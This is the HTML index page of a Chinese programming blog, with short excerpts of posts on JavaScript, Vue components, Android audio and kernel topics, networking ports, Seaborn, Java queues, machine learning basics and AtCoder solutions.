<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70332d83d5c8639c254e21f62fecac44/" rel="bookmark">
			JS根据条件判断是否向对象中添加某个值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 const data = { a : 1 }; const other = { b : 2, c : 3 } const temp = true; const res = { ...data, ...(temp &amp;&amp; other) } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3641b79ce22b64b255ce24191ec6da7a/" rel="bookmark">
			查看Android系统的音频设备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用adb shell dumpsys命令，该命令用于打印出当前系统信息，默认打印出设备中所有service的信息，可以在命令后面加指定的service name。
cmd adb shell dumpsys media.audio_policy - Available output devices: Device 1: - id: 2 - tag name: Earpiece - type: AUDIO_DEVICE_OUT_EARPIECE - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 2: - id: 3 - tag name: Speaker - type: AUDIO_DEVICE_OUT_SPEAKER - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 3: - id: 4 - tag name: Dgtl Dock Headset // - type: AUDIO_DEVICE_OUT_DGTL_DOCK_HEADSET - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 4: - id: 5 - tag name: Telephony Tx //电话下行数据，用于传输路由到手机无线装置的音频 - type: AUDIO_DEVICE_OUT_TELEPHONY_TX - Profiles: Profile 0: - format: - sampling rates: - channel masks: - Available input devices: Device 1: - id: 2 - tag name: Built-In Mic - type: AUDIO_DEVICE_IN_BUILTIN_MIC - address: bottom - Profiles: - format: - sampling rates: - channel masks: Device 2: - id: 3 - tag name: Built-In Back Mic - type: AUDIO_DEVICE_IN_BACK_MIC - address: back - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 3: - id: 4 - tag name: FM Tuner In //仅用于广播无线装置输入 - type: AUDIO_DEVICE_IN_FM_TUNER - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 4: - id: 5 - tag name: Echo Ref In - type: AUDIO_DEVICE_IN_ECHO_REFERENCE - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 5: - id: 6 - tag name: Voice Call In - type: AUDIO_DEVICE_IN_TELEPHONY_RX|AUDIO_DEVICE_IN_VOICE_CALL //电话上行数据，用于从移动网络电台接收到的与通话相关联的音频 - Profiles: Profile 0: - format: - sampling rates: - channel masks: Device 6: - id: 7 - tag name: Remote Submix In //表示被传输至远程接收设备的音频，这类音频数据流会被重定向至远程输出而非在本地扬声器或耳机播放。 - type: AUDIO_DEVICE_IN_REMOTE_SUBMIX - address: 0 - Profiles: Profile 0: - format: - sampling rates: - channel masks: 四种输出设备：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3641b79ce22b64b255ce24191ec6da7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dff8ac4ed79bd13adda538bd73fa8a3/" rel="bookmark">
			2.1 应用层的基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、应用层概述
1.应用层的基本概念
应用层的功能
进程的概念
用户代理
端口号
套接字
2.网络应用模式***
C/S模式（Client/Server模式）
P2P（peer to peer）模式
3.网络应用需要的服务
一、应用层概述 1.应用层的基本概念 应用层的功能 应用层协议定义 了应用程序 需交换的报文、所需采取的动作和最终通信数据的 应用 应用层位于协议栈的最高层次 应用层协议提供不同主机之间 进程 与 进程 之间的通信 用户 代理 实现应用层协议 进程的概念 进程（Process）：主机中动态运行的程序
一个程序运行多次将产生多个进程；操作系统使用PID标识进程。 用户代理 用户代理提供用户和网络应用之间的接口。
用户代理实现应用层协议；
常见的用户代理：浏览器、Web服务器软件、QQ等。 端口号 端口号是应用进程的入口标识，是一个存放在传输层首部的一个字段的值。
包括TCP端口号和UDP端口号，一个进程可能使用多个端口号。 端口属于传输层首部的一个字段，该字段占16bit,能表示的最大数值是65535，因此端口的范围是0-65535。一般基于客户服务器模式的网络应用都是由客户端首先发起请求报文，服务器再响应报文，因此客户端进程必须明确的知道服务器相关服务的端口才能和服务器服务进程通信。IETF规定0-1023端口为保留使用的端口，用于一些网络服务默认的端口号。例如DNS域名系统的默认服务端口为53，HTTP协议的默认端口为80,电子邮件服务器默认监听端口为25,邮局协议服务端口为110。端口号从1024-65535为用户可以使用的端口，一般来说客户端的通信进程使用的端口号是随机的从可用端口中取一个。
***常用端口号：
协议
端口号
传输层
定义
ftp-data
20
Tcp
FTP数据连接主动模式下的端口号
ftp
21
Tcp
FTP，control
ssh
22
Tcp
SSH Remote Login Protocol
telnet
23
Tcp
smtp
25
Tcp
Simple Mail Transfer
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dff8ac4ed79bd13adda538bd73fa8a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/021a076204a3b542d9e6a1e51d1aaa46/" rel="bookmark">
			Ant Design of Vue —— Table动态表头（顺序切换和控制显隐）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		业务需求 antd vue table 表头需要有部分固定字段和部分动态字段，动态字段可以调整显示隐藏和控制顺序。 效果展示 代码实现 &lt;-- 弹窗部分代码 --&gt; &lt;a-popover :getPopupContainer="getContainer" trigger="click" placement="bottomRight"&gt; &lt;template slot="title"&gt; &lt;div class="pop-title"&gt; &lt;div&gt;自定义显示列&lt;/div&gt; &lt;a-popconfirm title="确定要重置表头吗？" ok-text="确定" cancel-text="取消" @confirm="resetColumnsClick" &gt; &lt;div class="pop-reset"&gt;重置&lt;/div&gt; &lt;/a-popconfirm&gt; &lt;/div&gt; &lt;/template&gt; &lt;template slot="content"&gt; &lt;div class="setting-model"&gt; &lt;-- 使用vueDraggable组件实现拖动切换顺序效果 --&gt; &lt;VueDraggable v-model="common.setColumns" @start="drag = true" @end="drag = false" :move="onMove" handle=".dargBtn" filter=".undraggable" &gt; &lt;div class="setting-item" :class="element.isDisabled ? 'undraggable' : 'dargBtn'" v-for="(element, index) in common.setColumns" :key="index"&gt; &lt;a-icon type="menu" style="margin-right: 10px;"/&gt; &lt;a-checkbox v-model="element.isShow" :disabled="element.isDisabled"&gt; {{ element.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/021a076204a3b542d9e6a1e51d1aaa46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16bd2bd26afc38cc080546978cb85366/" rel="bookmark">
			Seaborn常见绘图总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以前粗略的学习过Matplotlib绘图、Pandas绘图（这里是pandas的常见绘图总结），但是都未深入的去学习过，一遇到问题就翻文档，效率低下。听“他们”说matplotlib中的seaborn绘图很好看而且实用，所以，这里系统的总结一下seaborn常见的图形绘制。其目的也是很简单，方便自己和给大家提供一些帮助（由于英文很菜，每次都查单词，有些词汇就翻译的很生硬，还请谅解……）。
差点忘了，这里使用的数据还是seaborn的默认数据，很多人再看seaborn的时候对数据一头雾水，这里我将存放数据的GitHub放在这儿，理解数据的含义，对分析问题往往起着事半功倍的效果。
https://github.com/mwaskom/seaborn-data
根据Seaborn的API，具体如下：
文章目录 正文1.Relational plots（关系图）1.1 scatterplot（散点图）1.2 lineplot（线图）1.3 relplot（关系图） 2.Categorical plots（分类图）2.1 Categorical scatterplots（分类散点图）2.1.1 stripplot（分布散点图）2.1.2 swarmplot（分布密度散点图） 2.2 Categorical distribution plots（分类分布图）2.2.1 boxplot（箱线图）2.2.2 violinplot（小提琴图）2.2.3 violinplot+stripplot（小提琴图+分布散点图）2.2.4 violinplot+swarmplot（小提琴图+分布密度散点图）2.2.5 boxplot+stripplot（箱线图+分布散点图）2.2.6 boxplot+swarmplot（箱线图+分布密度散点图） 2.3 Categorical estimate plots（分类估计图）2.3.1 barplot（条形图）2.3.2 countplot（计数图）2.3.3 piontplot（点图）2.3.4 catplot（） 3 Distribution plots（分布图）3.1 distplot（直方图）3.2 kdeplot（核密度图）3.3 jointplot（联合分布图）3.4 pairplot（变量关系组图） 4 Regression plots（回归图）4.1 lmplot（回归图）4.2 regplot（） 5.Matrix plots（矩阵图）5.1 heatmap（热力图）5.2 clustermap（聚类图） 6 FacetGrid（）7 PairGrid（）8 主题和颜色8.1 主题（style）8.2 环境（context）8.3 颜色（color_palette()） 补充Seaborn入门详细教程 正文 1.Relational plots（关系图） Seaborn中介绍的第一种类型的图就是Relational plots（关系图），这里翻译一下官网对他的解释：“统计分析是理解数据集中变量如何相互关联以及这些关系如何依赖于其他变量的过程。可视化可能是这个过程的核心部分，因为当数据被正确地可视化时，人类视觉系统可以看到指示某种关系的趋势和模式。”
Relational plots（关系图）中主要讨论的是三个seaborn函数。我们最常用的是relplot()。这是一个图形级函数使用两种常用方法可视化统计关系：散点图（scatter plots）和线图（line plots）。
1. scatterplot() (与kind="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16bd2bd26afc38cc080546978cb85366/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb001219f778c407eb322308673661eb/" rel="bookmark">
			el-cascader多选取消上次一级选中（一级单选，二级多选）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		每次选择的时候取消上一次一级的选中，也相当于一级单选，二级多选
&lt;el-cascader v-model="value" :options="options" :props="props" clearable @expand-change="expandChange"&gt;&lt;/el-cascader&gt; data() { return { value:[], options: [{ value: 1, label: '东南', children: [{ value: 2, label: '上海', children: [ { value: 3, label: '普陀' }, { value: 4, label: '黄埔' }, { value: 5, label: '徐汇' } ] }, { value: 7, label: '江苏', children: [ { value: 8, label: '南京' }, { value: 9, label: '苏州' }, { value: 10, label: '无锡' } ] }, { value: 12, label: '浙江', children: [ { value: 13, label: '杭州' }, { value: 14, label: '宁波' }, { value: 15, label: '嘉兴' } ] }] }, { value: 17, label: '西北', children: [{ value: 18, label: '陕西', children: [ { value: 19, label: '西安' }, { value: 20, label: '延安' } ] }, { value: 21, label: '新疆维吾尔族自治区', children: [ { value: 22, label: '乌鲁木齐' }, { value: 23, label: '克拉玛依' } ] }] }], props: { multiple: true }, } }, methods: { expandChange(){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb001219f778c407eb322308673661eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24a7d09dddaa61d22f017d8ef7dcd9aa/" rel="bookmark">
			Android 内核概览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://source.android.com/docs/core/architecture/kernel?hl=zh-cn
Android 内核基于上游 Linux 长期支持 (LTS) 内核。在 Google，LTS 内核会与 Android 专用补丁结合，形成所谓的“Android 通用内核 (ACK)”。
较新的 ACK（版本 5.4 及更高版本）也称为 GKI 内核，因为它们支持将与硬件无关的通用核心内核代码和与硬件无关的 GKI 模块分离开来。 GKI 内核会与包含系统芯片 (SoC) 和板级代码的硬件专用供应商模块进行交互。GKI 内核与供应商模块之间的交互通过内核模块接口 (KMI) 来实现，该接口由标识供应商模块所需的函数和全局数据的符号列表组成。图 1 显示了 GKI 内核和供应商模块架构： 图 1. GKI 内核和供应商模块架构
注意：GKI 内核、GKI 模块和供应商模块架构是我们多年来一直致力于开展的通用内核映像 (GKI) 项目的成果。如需了解此项目及其发展阶段，请参阅通用内核映像 (GKI) 项目。
内核术语表 本部分包含整个内核文档中使用的术语。
内核类型 Android 通用内核 (ACK)
ACK 是长期支持 (LTS) 内核的下游，包含与 Android 社区相关但尚未合并到 Linux Mainline 或 LTS 内核的补丁。较新的 ACK（版本 5.4 及更高版本）也称为 GKI 内核，因为它们支持将与硬件无关的通用内核代码和与硬件无关的 GKI 模块分离开来。
Android 开源项目 (AOSP) 内核
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24a7d09dddaa61d22f017d8ef7dcd9aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/133dc2fc331af2c46e42885383a4d164/" rel="bookmark">
			针对turtle.setheading()与turtle.right(),turtle.left()的讨论：
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		针对turtle.setheading()与turtle.right(),turtle.left()的讨论： 以三角形为例：
turtle.left() import turtle as t for i in range(3): t.left(i*120) t.fd(200) turtle.seth() import turtle as t for i in range(3): t.seth(i*120)	#海龟的方向始终是朝正方向 t.fd(200) 区别： &lt;1&gt;. turtle.left()与turtle.right()用法一致，所以我以turtle.left()为例，
left为逆时针，right为顺时钟。
小乌龟的方向随着旋转角度的变化而变化。
&lt;2&gt;. turtle.setheading(angle)可简写为turtle.seth()
其中逆时针旋转为正，顺时针旋转为负。
小乌龟不管怎样旋转，它的方向始终是朝向x轴正方向
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0726f15dde1429181dd27caea6eeb5b7/" rel="bookmark">
			Java 中的阻塞队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是阻塞队列
7 个阻塞队列
ArrayBlockingQueue：一个由数组结构组成的有界阻塞队列。
LinkedBlockingQueue：一个由链表结构组成的有界阻塞队列。
PriorityBlockingQueue：一个支持优先级排序的无界阻塞队列。
DelayQueue：一个使用优先级队列实现的无界阻塞队列。
SynchronousQueue：一个不存储元素的阻塞队列。
LinkedTransferQueue：一个由链表结构组成的无界阻塞队列。
LinkedBlockingDeque：一个由链表结构组成的双向阻塞队列。
什么是阻塞队列 阻塞队列（BlockingQueue）是一个支持两个附加操作的队列。
这两个附加的操作支持阻塞的插入和移除方法。
支持阻塞的插入方法：意思是当队列满时，队列会阻塞插入元素的线程，直到队列不满。支持阻塞的移除方法：意思是在队列为空时，获取元素的线程会等待队列变为非空。 阻塞队列常用于生产者和消费者的场景，生产者是向队列里添加元素的线程，消费者是从队列里取元素的线程。阻塞队列就是生产者用来存放元素、消费者用来获取元素的容器。
抛出异常：当队列满时，如果再往队列里插入元素，会抛出 IllegalStateException （"Queue full"）异常。当队列空时，从队列里获取元素会抛出 NoSuchElementException 异常。返回特殊值：当往队列插入元素时，会返回元素是否插入成功，成功返回 true。 如果是移除方法，则是从队列里取出一个元素，如果没有则返回 null。一直阻塞：当阻塞队列满时，如果生产者线程往队列里 put 元素，队列会一直阻塞生产者线程，直到队列可用或者响应中断退出。当队列空时，如果消费者线程从队列里 take 元素，队列会阻塞住消费者线程，直到队列不为空。超时退出：当阻塞队列满时，如果生产者线程往队列里插入元素，队列会阻塞生产者线程一段时间，如果超过了指定的时间，生产者线程就会退出。如果是无界阻塞队列，队列不可能会出现满的情况，所以使用 put 或 offer 方法永远不会被阻塞，而且使用 offer 方法时，该方法永远返回 true。 7 个阻塞队列 ArrayBlockingQueue：一个由数组结构组成的有界阻塞队列。 ArrayBlockingQueue 是一个用数组实现的有界阻塞队列。此队列按照先进先出 （FIFO）的原则对元素进行排序。默认情况下不保证线程公平的访问队列。
// 访问者的公平性是使用可重入锁实现的。 public ArrayBlockingQueue(int capacity, boolean fair) { if (capacity &lt;= 0) throw new IllegalArgumentException(); this.items = new Object[capacity]; lock = new ReentrantLock(fair); notEmpty = lock.newCondition(); notFull = lock.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0726f15dde1429181dd27caea6eeb5b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/254dba7ba4ec407ccd3c00875f7ed3f8/" rel="bookmark">
			机器学习入门必知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器学习入门必知 一、机器学习中的术语表达输入空间和输出空间训练集，验证集和测试集 二、分类1 基本分类监督学习无监督学习强化学习半监督学习主动学习 2 按模型分类概率模型和非概率模型线性模型和非线性模型参数化模型和非参数化模型 3 按算法分类在线学习批量学习 三、机器学习三要素1 模型2 策略结构风险最小化策略交叉验证 3 算法 这篇文章的东西比较杂且碎，但都是很重要的必知知识，磨刀不误砍柴工。 一、机器学习中的术语表达 输入空间和输出空间 每个输入都是一个实例x，每个实例x都由n个特征来描述，一般用向量描述，x=(x(1),x(2),…,x(n))T。
n个实例x1,x2,…,xn的集合称为输入空间（有时候也叫特征空间）。
输入空间中的每个输入对应的输出y1,y2,…,yn的集合称为输出空间。
举个例子，假如在预测房价的模型中，每个输入都是一个房子x，每个房子x由面积x(1)和楼层x(2)两个特征来描述，那么房子x1可以描述为这样的向量:x1=(x(1)=120m2,x(2)=3层)T，其房价y1=300w；房子x2可以描述为这样的向量:x2=(x(1)=89m2,x(2)=6层)T，其房价y2=200w。
训练集，验证集和测试集 训练集用来训练模型，相当于课本的作用；
验证集用来选择模型，相当于课后作业的作用；
测试集用来最终评估，相当于最终的考试。
机器学习范围太广，并没有统一的理论体系涵盖所有内容，只能从多个角度对机器学习进行分类。
二、分类 1 基本分类 监督学习 监督学习从有标注数据中学习预测模型，本质是学习输入输出的映射的统计规律。而数据的标注通常是人工给出的，所以称为监督学习。（下面会结合一个关于预测房价的例子来讲）
在监督学习中，每个输入都是一个实例x，由特征向量来表示这个x，描述x的特征个数决定了特征向量的维度（比如每个输入都是一个房子x，每个房子由楼层x(1)，面积x(2)两个特征来描述，所以每个x其实都是一个二维向量，第一个房子x1，第二个房子x2…第n个房子xn的集合就是特征空间）。
每个输出都是一个y（比如第一个房子x1的房价为y1=100w）。
重点来了，监督学习的训练数据集T中的每个元素都是一个输入输出对，T={（x1，y1）,（x2，y2）,…,（xn，yn）}，每个训练数据都是带有标注y的，也就是说训练数据集中的每个房子的房价都已经告诉你了，而我们的目的是预测一个没见过的房子的价格。那么下一步就是通过训练数据集T来学习一个模型，当遇到一个训练数据集中没有的x时，通过该模型预测一个输出y。
监督学习有三个主要应用
回归问题，此类问题的输入变量连续，输出变量也是连续的，例如预测房价问题；分类问题，此类问题的输入变量可以是离散的，也可以是连续的，但输出变量一定是离散的，例如预测肿瘤良性或恶性的问题，输出只有良和恶两个离散值；标注问题，此类问题的输入和输出都是变量序列，例如词性标注问题。 无监督学习 可以很容易的想到，无监督学习就是从=无标注=的数据中学习预测模型。其本质是学习数据中的统计规律和潜在结构。它的训练数据集T中的每个元素并不是输入输出对，只有输入x。当遇到缺乏先验知识，人工标注太难或成本太高时，就可以来考虑考虑无监督学习了。
无监督学习最常用在聚类、降维中。
假如给出一堆数据，要学习它的潜在规律，学习之后，电脑发现某一堆点有共同的特征，便把它们归成一类，这便是聚类，如下图。
聚类又可以分为硬聚类和软聚类，硬聚类中的每个输入x只会被归为某一类，软聚类中的输入x有可能会被归为多类。
在机器学习中，并不是每个特征都对最后的结果有贡献，把没用的特征去掉，就是对特征空间进行降维，还降低了计算量。无监督学习用在降维中最常见的应用就是图像压缩，如下图，从第一张高清的s经过降维后转换成第二张，并不妨碍我们从第二张认出来它是个s，还降低了存储空间。
关于无监督学习的常用算法有：
等距映射法，局部线性嵌入法，拉普拉斯特征映射法，黑塞局部线性嵌入法，局部切空间排列法等
强化学习 强化学习是指智能系统在与环境的连续互动中学习最优行为策略。比如一个机器人要学习如何走到大门，当它走了一步离大门更近时，给它一个奖励，当它走了一步离大门更远了，便不给它奖励，为了得到更多的奖励，机器人最终会得到一条走到大门的最佳路线。
在强化学习中，智能系统不断地试错，它的目标不是短期奖励的最大化，而是长期累积奖励的最大化。比如阿尔法狗，它走当下这一步或许得到的奖励不是最大，但它通过计算知道下一步它会得到超级大的奖励，那么为了追求长期累积奖励的最大化，阿尔法狗会选择在目前来看并不是奖励最大的行为。
强化学习经常用在不需要进行一次决策的情形中，决策的量变才会引起结果的质变，关键的地方在于如何定义什么是应该奖励的行为，什么是应该惩罚的行为。
半监督学习 半监督学习的数据集通常有少量有标注，大量无标注，利用无标注的数据来辅助有标注数据，进行学习，以较低的成本达到较好的学习效果。
主动学习 主动学习是指机器不断主动给出实例让教师进行标注。
例如我们在刷小视频时，如果看到一条不喜欢的视频，我们可以将视频选成“不感兴趣”，之后app就会减少推送此类视频给你，在这里你相当于教师，你主动标注了你不喜欢的视频。
监督学习中的标注数据往往是随机得到的，可以看作是“被动学习”。
2 按模型分类 概率模型和非概率模型 概率模型在监督学习中是条件概率分布形式，比如“女生各个年龄段的身高模型”，预测18岁的女生身高是多少？模型并不是直接给出一个答案，而是从“18岁女生身高为163cm的概率=0.4，为168的概率=0.2，为170cm的概率=0.1”，从类似这样的概率分布中得到概率最大的身高为163cm，并把它作为答案输出。
非概率模型在监督学习中是函数f(x)的形式，比如输入一个女生的年龄=20岁，直接输出一个y=166cm。
概率模型的例子：决策树、朴素贝叶斯、隐马尔可夫模型、条件随机场、概率潜在语义分析、潜在迪利克雷分配、高斯混合模型；
非概率模型的例子：感知机、支持向量机、k近邻、AdaBoost、k均值、潜在语义分析、神经网络；
既可以看作概率模型也可看作非概率模型的例子：逻辑斯谛回归。
线性模型和非线性模型 特别的，对于非概率模型来说，如果函数是线性的，就是线性模型，否则就是非线性模型。
线性模型的例子：感知机、线性支持向量机、k近邻、k均值、潜在语义分析；
非线性模型的例子：核函数支持向量机、AdaBoost、神经网络。现在大火的深度学习其实就是学习复杂的非线性模型。
参数化模型和非参数化模型 模型是有参数的，参数化模型的参数固定或有限。非参数化模型的参数不固定或无限。
参数化模型的例子：感知机、朴素贝叶斯、逻辑斯谛回归、k均值、高斯混合模型、潜在语义分析、概率潜在语义分析、潜在迪利克雷分配；
非参数化模型的例子：决策树、支持向量机、AdaBoost，k近邻。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/254dba7ba4ec407ccd3c00875f7ed3f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/967510b356c57c68964c8a7589ab7e3e/" rel="bookmark">
			JVM -XMX与XMS是什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XMS : JVM初始分配的堆内存 XMX : JVM最大允许分配的堆内存，按需分配 堆内存分配:
默认空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制；
空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。
因此服务器一般设置-Xms、-Xmx相等以避免在每次GC 后调整堆的大小。
说明：如果-Xmx 不指定或者指定偏小，应用可能会导致java.lang.OutOfMemory错误，此错误来自JVM。解决办法是调整对应的-XMX参数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f47989f38d2aa91cab08e713f9ba01a4/" rel="bookmark">
			SDK证书安装失败Flutter
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flutter assets will be downloaded from https://storage.flutter-io.cn. Make sure you trust this source!
Android sdkmanager not found. Update to the latest Android SDK and ensure that the cmdline-tools are installed to
resolve this. 翻译出来的是：是否并确保安装了cmdline-tools
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dd615a526c15bc62d34d35adb5f772f/" rel="bookmark">
			Atcoder Beginner Contest 269（A-G）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Atcoder Beginner Contest 269 A - Anyway Takahashi 题目太水了，一年级小朋友都可以做
#include&lt;bits/stdc++.h&gt; using namespace std; int main(){ int a,b,c,d; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c&gt;&gt;d; cout&lt;&lt;(a+b)*(c-d)&lt;&lt;endl; cout&lt;&lt;"Takahashi"; } B - Rectangle Detection 遍历这十个字符串，不断地更新左边界，右边界的大小即可，取最小的左边界和最大的右边界
#include&lt;bits/stdc++.h&gt; using namespace std; char s[20][20]; int main(){ for(int i=1;i&lt;=10;i++) cin&gt;&gt;s[i]+1; int minl=11,maxl=-1; int minr=11,maxr=-1; for(int i=1;i&lt;=10;i++){ for(int j=1;j&lt;=10;j++){ if(s[i][j]=='#'){ minl=min(minl,i); maxl=max(maxl,i); minr=min(minr,j); maxr=max(maxr,j); } } } cout&lt;&lt;minl&lt;&lt;' '&lt;&lt;maxl&lt;&lt;endl; cout&lt;&lt;minr&lt;&lt;' '&lt;&lt;maxr&lt;&lt;endl; } C - Submask 位运算 构造
这道题让我们求原来的那个数含有1的位置的子集，联想到快速幂，可以将原数中含有1的位置保存下来，然后新建一个vector保存答案。
接下来遍历保存1位置的那个数组，将答案数组中的每一个数的二进制那一位上的数从0变成1，再将产生的新数保存在答案数组里。
#include&lt;bits/stdc++.h&gt; using namespace std; int main(){ long long x; cin &gt;&gt; x; vector&lt;long long&gt; res={0}; for(int d=0;d&lt;60;d++){ if(x&amp;(1ll&lt;&lt;d)){ int sz=res.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4dd615a526c15bc62d34d35adb5f772f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a635b00e1e233906b7c25c2f0b88c9d/" rel="bookmark">
			RK3588通过IO命令操作寄存器的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RK3588通过IO命令操作寄存器的方法 文章目录 RK3588通过IO命令操作寄存器的方法IO命令用法kernel阶段使用的是IO命令来读写寄存器uboot阶段寄存器读写命令MD IO命令使用环境RK3588寄存器地址查看方法实例：通过IO命令查看GPIO的iomux状态实例：通过IO命令设置GPIO的iomux状态 IO命令用法 kernel阶段使用的是IO命令来读写寄存器 io -v -1|2|4 -r|w [-l &lt;len&gt;] [-f &lt;file&gt;] &lt;addr&gt; [&lt;value&gt;] -v Verbose, asks for confirmation -1|2|4 Sets memory access size in bytes (default byte) -l &lt;len&gt; Length in bytes of area to access (defaults to one access, or whole file length) -r|w Read from or Write to memory (default read) -f &lt;file&gt; File to write on memory read, or to read on memory write &lt;addr&gt; The memory address to access &lt;val&gt; The value to write (implies -w) Examples: io 0x1000 Reads one byte from 0x1000 io 0x1000 0x12 Writes 0x12 to location 0x1000 io -2 -l 8 0x1000 Reads 8 words from 0x1000 io -r -f dmp -l 100 200 Reads 100 bytes from addr 200 to file io -w -f img 0x10000 Writes the whole of file to memory Note access size (-1|2|4) does not apply to file based accesses.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a635b00e1e233906b7c25c2f0b88c9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3013e380a7fe7ab5fcd4fb659df8a9b8/" rel="bookmark">
			神经网络与深度学习（四）线性分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
3.1 基于Logistic回归的二分类任务
3.1.1 数据集构建
3.1.2 模型构建
3.1.3 损失函数
3.1.4 模型优化
3.1.4.1 梯度计算
3.1.4.2 参数更新
3.1.5 评价指标
3.1.6 完善Runner类
3.1.7 模型训练
3.1.8 模型评价
3.2 基于Softmax回归的多分类任务
3.2.1 数据集构建
3.2.2 模型构建
3.2.2.1 Softmax函数 3.2.2.2 Softmax回归算子 3.2.3 损失函数
3.2.4 模型优化
3.2.4.1 梯度计算 3.2.4.2 参数更新
3.2.5 模型训练
3.2.6 模型评价
3.3 实践：基于Softmax回归完成鸢尾花分类任务
3.3.1 数据处理 3.3.1.1 数据集介绍
3.3.1.2 数据清洗 3.3.1.3 数据读取 ​ 3.3.2 模型构建
3.3.4 模型评价 3.3.5 模型预测 3.4 小结 3.5 实验拓展
参考资料 3.1 基于Logistic回归的二分类任务 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3013e380a7fe7ab5fcd4fb659df8a9b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b614498b8261ff3d8ce3ae190ff64c75/" rel="bookmark">
			栈和队列相关操作及代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 栈
1.1 顺序存储：顺序栈
